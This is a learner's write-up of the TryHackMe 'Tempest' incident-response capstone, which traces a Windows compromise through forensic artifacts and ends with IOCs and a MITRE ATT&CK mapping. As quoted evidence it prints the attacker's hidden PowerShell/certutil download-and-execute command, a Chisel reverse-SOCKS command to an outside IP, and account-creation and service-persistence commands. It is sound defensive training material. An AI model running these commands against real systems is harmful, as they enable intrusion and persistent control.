@@ -1,0 +1,400 @@
+# Tempest — TryHackMe Capstone Write-Up
+
+| Field          | Details                                              |
+|----------------|------------------------------------------------------|
+| **Author**     | Linus Yohanna                                        |
+| **Date**       | July 2025                                            |
+| **Platform**   | TryHackMe                                            |
+| **Category**   | DFIR / Incident Response / Threat Hunting            |
+| **Room Type**  | Capstone — End-to-End Investigation                  |
+| **Difficulty** | Hard                                                 |
+| **Status**     | ✅ Completed                                         |
+
+---
+
+## 📌 Scenario
+
+A machine has been compromised. As the **Incident Responder**, my task was to analyze captured artifacts from the affected system — tracing the attacker's actions from the moment of initial access through to full machine ownership.
+
+This is not a single-alert investigation. It is a complete kill chain reconstruction: every phase of the attack documented, every artifact verified, every tool identified.
+
+---
+
+## 🛠️ Tools & Artifacts
+
+| Tool | Purpose |
+|------|---------|
+| **PowerShell** | SHA256 file hashing for artifact integrity verification |
+| **Timeline Explorer** | Windows artifact analysis — process execution, file downloads, command-line forensics |
+| **EvtxECmd** | Windows Event Log (.evtx) parsing and conversion |
+| **Event Viewer** | Windows Event Log review — account creation, group changes |
+| **Brim (Zui)** | Network traffic analysis — PCAP investigation, URL reconstruction |
+| **Wireshark** | Deep packet inspection — credential and port discovery |
+| **VirusTotal** | Hash-based threat intelligence — tool and malware identification |
+
+---
+
+## 🔐 Phase 0 — File Integrity Verification (Hashing)
+
+Before any analysis begins, the integrity of every provided artifact must be verified. A tampered or corrupted artifact produces unreliable findings — inadmissible in a real incident response engagement.
+
+**Tool:** PowerShell
+**Algorithm:** SHA256
+
+```powershell
+Get-FileHash -Algorithm SHA256 <file_location>
+```
+
+SHA256 hashes were generated for all incident artifacts. Verified hashes confirm the files are unmodified since collection — establishing a clean, trustworthy evidence baseline for the full investigation.
+
+---
+
+## 🎣 Phase 1 — Initial Access: Malicious Document
+
+**Objective:** Identify how the attacker gained their first foothold on the machine.
+
+### Finding
+
+A malicious Microsoft Word document was downloaded via **Google Chrome**:
+
+```
+Filename:  free_magicules.doc
+Browser:   Google Chrome
+```
+
+**Tool used:** Timeline Explorer — filtered to Chrome download activity to identify the file, the process that opened it, and the associated PID.
+
+### Analysis
+
+Once opened in Microsoft Word, the document contained an **embedded Base64-encoded string**. Decoded, this string revealed a malicious URL:
+
+```
+http://phishteam.xyz
+```
+
+The document's purpose was to deceive the user into opening it, triggering execution of the embedded payload through Word's macro or object execution capability. The Base64 encoding was used to obfuscate the malicious domain from basic string scanning.
+
+**Attacker infrastructure identified:** `phishteam.xyz`
+
+---
+
+## ⚙️ Phase 2 — Initial Access: Stage 2 Execution
+
+**Objective:** Trace what happened immediately after the malicious document executed.
+
+### Finding
+
+The document triggered a **PowerShell command** executed in hidden, non-interactive mode — a deliberate evasion technique to prevent a visible terminal window from alerting the user:
+
+```powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+```
+
+**Tool used:** Timeline Explorer — process execution artifacts revealed the full command line.
+
+### Breakdown
+
+| Parameter | Meaning |
+|-----------|---------|
+| `-w hidden` | Runs PowerShell window hidden from the user |
+| `-noni` | Non-interactive mode — no user prompts |
+| `certutil -urlcache -split -f` | LOLBin abuse — uses Windows' native certificate tool to download a file |
+| `http://phishteam.xyz/02dcf07/first.exe` | Remote malicious binary download URL |
+| `C:\Users\Public\Downloads\first.exe` | Drop location — Public Downloads, accessible to all users |
+| `; C:\Users\Public\Downloads\first.exe` | Immediately executes the downloaded binary |
+
+The binary `first.exe` was downloaded and executed in the same command. Its SHA256 hash was retrieved for threat intelligence lookup:
+
+```
+first.exe SHA256: [derived from timeline explorer artifacts]
+```
+
+**C2 connection established:**
+
+```
+resolvecyber.xyz:8080
+```
+
+---
+
+## 🌐 Phase 3 — Initial Access: Malicious Document Traffic
+
+**Objective:** Analyze the network traffic generated by the malicious document and Stage 2 execution.
+
+**Tool used:** Brim (Zui) — filtered PCAP for the attacker's domain
+
+### Network Analysis
+
+```
+Brim filter: phishteam.xyz
+```
+
+**Full URL reconstructed:**
+
+```
+http://phishteam.xyz/02dcf07/index.html
+```
+
+The URL was **Base64-encoded** within the document — consistent with the encoding observed in Phase 1. Decoding it revealed the full path used to stage the attack.
+
+### HTTP Request Details
+
+| Field | Value |
+|-------|-------|
+| **URL Path** | `/9ab62b5` |
+| **HTTP Method** | GET |
+| **Parameter** | `q` |
+| **User-Agent** | Contains `Nim` — indicating the binary was written in the Nim programming language |
+
+> **Analyst note:** The presence of **Nim** in the user-agent is a significant threat intelligence indicator. Nim is increasingly used by malware authors because it compiles to small, efficient binaries and is not widely detected by signature-based AV engines. Its presence here points to a deliberate, tooled attacker — not a script kiddie.
+
+---
+
+## 🔍 Phase 4 — Discovery: Internal Reconnaissance
+
+**Objective:** Identify what the attacker did to map the internal environment after gaining access.
+
+**Tools used:** Wireshark (credential and port discovery) → Timeline Explorer (binary hash) → VirusTotal (tool identification)
+
+### Finding 1 — Sensitive File Discovery
+
+Wireshark analysis of internal traffic revealed the attacker accessed a file containing **credentials (passwords)**. Sensitive data was identified within packet captures — confirming the attacker was actively harvesting internal credentials.
+
+### Finding 2 — Port Identification for Lateral Movement
+
+**Port 5985** was identified — this is the **WinRM (Windows Remote Management)** port, which provides remote PowerShell shell access. Knowing this port was open, the attacker had a clear lateral movement path.
+
+### Finding 3 — Reverse SOCKS Proxy (Chisel)
+
+The attacker established a **reverse SOCKS proxy** to tunnel traffic through the compromised machine:
+
+```cmd
+C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+```
+
+**Binary hash:**
+
+```
+SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+```
+
+**VirusTotal lookup → Tool identified: Chisel**
+
+Chisel is a legitimate network tunneling tool — weaponized here to create a covert communication channel between the compromised machine and the attacker's infrastructure at `167.71.199.191:8080`.
+
+### Finding 4 — Credential-Based Authentication via WinRM
+
+Using the harvested credentials, the attacker authenticated to the machine over **WinRM** — the remote shell port identified in Finding 2. This gave the attacker interactive remote access without needing to exploit another vulnerability.
+
+---
+
+## ⬆️ Phase 5 — Privilege Escalation: PrintSpoofer
+
+**Objective:** Determine how the attacker moved from standard user access to full system privileges.
+
+**Tools used:** Timeline Explorer → VirusTotal
+
+### Finding
+
+The attacker downloaded a second binary:
+
+```
+Filename: spf.exe
+SHA256:   8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
+```
+
+**VirusTotal lookup → Tool identified: PrintSpoofer**
+
+PrintSpoofer is a well-documented privilege escalation tool that exploits the **SeImpersonatePrivilege** — a Windows privilege granted to service accounts that allows them to impersonate other users. When this privilege is held by a compromised account, PrintSpoofer can abuse it to escalate to **SYSTEM-level access**.
+
+### Stage 2 of Escalation
+
+Following privilege escalation, the attacker downloaded and executed:
+
+```
+Filename: final.exe
+```
+
+`final.exe` established a new **C2 connection on port 8080** — now running under elevated SYSTEM privileges, giving the attacker full, unrestricted control of the machine.
+
+---
+
+## 🏁 Phase 6 — Actions on Objectives: Full Machine Ownership
+
+**Objective:** Document what the attacker did once they achieved full control.
+
+**Tools used:** Event Viewer (Event IDs 4720, 4732) → Timeline Explorer (service creation)
+
+### Action 1 — New User Account Creation
+
+The attacker created two new user accounts for persistent access:
+
+```
+New accounts: shion, shuna
+```
+
+**Verified via:** Event ID 4720 — User Account Created
+
+```
+EventID: 4720 → Account creation confirmed for both users
+```
+
+### Action 2 — Administrator Group Addition
+
+One of the newly created accounts was added to the local Administrators group:
+
+```cmd
+net localgroup administrators /add shion
+```
+
+**Verified via:** Event ID 4732 — Member Added to Security-Enabled Local Group
+
+```
+EventID: 4732 → shion added to Administrators group confirmed
+```
+
+### Action 3 — Persistent Service Installation
+
+To maintain access beyond active sessions, the attacker registered `final.exe` as a **Windows service** set to start automatically on boot:
+
+```cmd
+C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
+```
+
+**Tool used:** Timeline Explorer — filtered to `sc.exe` execution artifacts
+
+**Translation:**
+- `TempestUpdate2` — service name chosen to appear like a legitimate system update
+- `binpath= C:\ProgramData\final.exe` — the C2 binary registered as the service executable
+- `start= auto` — executes automatically on every system startup
+
+Even if the machine is rebooted or the active session ends, the attacker's C2 binary relaunches automatically. The machine is fully owned.
+
+---
+
+## 🗺️ Full Attack Chain — Reconstructed
+
+```
+[Phase 1] User downloads free_magicules.doc via Chrome
+                    ↓
+[Phase 2] Word opens document → Base64 decoded → phishteam.xyz revealed
+                    ↓
+[Phase 2] PowerShell (hidden) + certutil downloads first.exe → executes
+          C2: resolvecyber.xyz:8080
+                    ↓
+[Phase 3] Network traffic confirms phishteam.xyz delivery
+          Nim binary identified via User-Agent
+                    ↓
+[Phase 4] Attacker discovers password file + WinRM port (5985)
+          Deploys Chisel (ch.exe) → reverse SOCKS proxy to 167.71.199.191:8080
+          Authenticates via WinRM using harvested credentials
+                    ↓
+[Phase 5] Downloads spf.exe (PrintSpoofer) → exploits SeImpersonatePrivilege
+          Downloads final.exe → C2 on port 8080 under SYSTEM privileges
+                    ↓
+[Phase 6] Creates users: shion + shuna (EventID 4720)
+          Adds shion to Administrators (EventID 4732)
+          Registers final.exe as auto-start service: TempestUpdate2
+          ✅ Machine fully owned
+```
+
+---
+
+## 🔑 Indicator of Compromise (IOC) Summary
+
+| IOC Type | Value |
+|----------|-------|
+| Malicious Document | `free_magicules.doc` |
+| Attacker Domain (Stage 1) | `phishteam.xyz` |
+| Stage 2 Download URL | `http://phishteam.xyz/02dcf07/first.exe` |
+| C2 Server (Stage 2) | `resolvecyber.xyz:8080` |
+| C2 Infrastructure | `167.71.199.191:8080` |
+| Tunnel Tool | Chisel (`ch.exe`) — SHA256: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451` |
+| PrivEsc Tool | PrintSpoofer (`spf.exe`) — SHA256: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D` |
+| Persistence Binary | `final.exe` — registered as `TempestUpdate2` service |
+| Attacker Accounts | `shion`, `shuna` |
+| Exploited Privilege | `SeImpersonatePrivilege` |
+
+---
+
+## 🧩 Challenges & How I Solved Them
+
+**Timeline Explorer — new tool, new logic**
+Timeline Explorer was completely new. Understanding how to navigate and filter its artifact view took deliberate time and patience before the investigation could move forward productively.
+
+**Resolution:** Worked through it methodically — learned the filter structure, understood what each column represented, and built familiarity by applying it to each phase rather than trying to learn it in isolation.
+
+**Brim — understanding what to look for**
+Brim's interface was intuitive, but the challenge was knowing *what* to search for within the PCAP — not the tool, but the investigative question.
+
+**Resolution:** Led with the known attacker domain (`phishteam.xyz`) as the initial filter, then expanded from there. Starting with a known indicator and widening the investigation is more effective than starting broad.
+
+---
+
+## 💡 Key Learnings
+
+1. **Every detail matters — and small details connect.** A Base64 string in a Word document leads to a domain, which leads to a binary, which leads to a C2 server, which leads to full machine compromise. No artifact is too small to investigate.
+
+2. **LOLBins are a primary attacker weapon.** Both `certutil` (download) and `sc.exe` (service creation) are legitimate Windows tools abused here. Detecting LOLBin abuse requires understanding what these tools *should* do — so you recognize when they're doing something they shouldn't.
+
+3. **Nim in the user-agent is a threat intelligence signal.** Knowing that uncommon programming languages in HTTP user-agents can fingerprint attacker tooling is the kind of contextual knowledge that separates a good analyst from a great one.
+
+4. **Tool-to-phase mapping is critical.** Different artifacts require different tools. PCAP → Brim/Wireshark. Process execution → Timeline Explorer. Event logs → EvtxECmd/Event Viewer. Hashes → VirusTotal. Using the right tool for each phase speeds up the investigation dramatically.
+
+5. **Incident response demands a different mindset than alert triage.** A SOC analyst identifies and escalates. An incident responder reconstructs the full story — beginning, middle, and end — with documented evidence at every step.
+
+---
+
+## 🌍 Real-World Application
+
+This capstone mirrors a real incident response engagement. In an actual compromise, an IR analyst receives collected artifacts from the affected machine and must reconstruct what happened — without a guided checklist.
+
+The tools used here (Timeline Explorer, EvtxECmd, Brim, Wireshark) are real-world DFIR tools used by professional incident responders. The techniques observed — LOLBin abuse, Base64 obfuscation, reverse SOCKS proxying, SeImpersonatePrivilege exploitation, service-based persistence — appear in real APT campaigns and ransomware intrusions documented in threat intelligence reports.
+
+Completing this capstone demonstrates the ability to: verify artifact integrity, reconstruct an attack timeline across multiple artifact types, identify attacker tools via hash intelligence, and produce a documented, evidence-backed incident report — the core deliverable of a professional incident response engagement.
+
+---
+
+## ➡️ Next Steps
+
+- [ ] Study the full PrintSpoofer exploit in depth — understand *why* SeImpersonatePrivilege is dangerous and which service accounts commonly hold it
+- [ ] Research Chisel further — understand how SOCKS proxying enables lateral movement and C2 tunneling in enterprise environments
+- [ ] Map this entire attack chain to MITRE ATT&CK formally — each phase has at least one technique ID
+- [ ] Practice Nim binary analysis — understand what Nim-compiled malware looks like at the binary level
+- [ ] Pursue a full DFIR-focused room or path to build on this capstone
+
+---
+
+## 🗂️ MITRE ATT&CK Mapping
+
+| Phase | Technique | ID |
+|-------|-----------|-----|
+| Initial Access | Phishing: Spearphishing Attachment | T1566.001 |
+| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
+| Execution | User Execution: Malicious File | T1204.002 |
+| Defense Evasion | Obfuscated Files or Information: Command Obfuscation (Base64) | T1027.010 |
+| Defense Evasion | System Binary Proxy Execution: certutil | T1218 |
+| C2 | Application Layer Protocol | T1071 |
+| C2 | Protocol Tunneling (Chisel/SOCKS) | T1572 |
+| Discovery | Network Service Discovery (Port 5985) | T1046 |
+| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 |
+| Privilege Escalation | Access Token Manipulation: SeImpersonatePrivilege | T1134 |
+| Persistence | Create Account: Local Account | T1136.001 |
+| Persistence | Create or Modify System Process: Windows Service | T1543.003 |
+
+---
+
+## 📎 References
+
+- [PrintSpoofer — GitHub](https://github.com/itm4n/PrintSpoofer)
+- [Chisel — GitHub](https://github.com/jpillora/chisel)
+- [LOLBAS — certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
+- [LOLBAS — sc.exe](https://lolbas-project.github.io/lolbas/Binaries/Sc/)
+- [VirusTotal](https://www.virustotal.com)
+- [MITRE ATT&CK](https://attack.mitre.org)
+- [Timeline Explorer — Eric Zimmerman Tools](https://ericzimmerman.github.io/)
+- [Brim / Zui](https://www.brimdata.io/)
+
+---
+
+*Linus Yohanna | Actively exploring the cyber space and building threat intelligence, one layer at a time.*
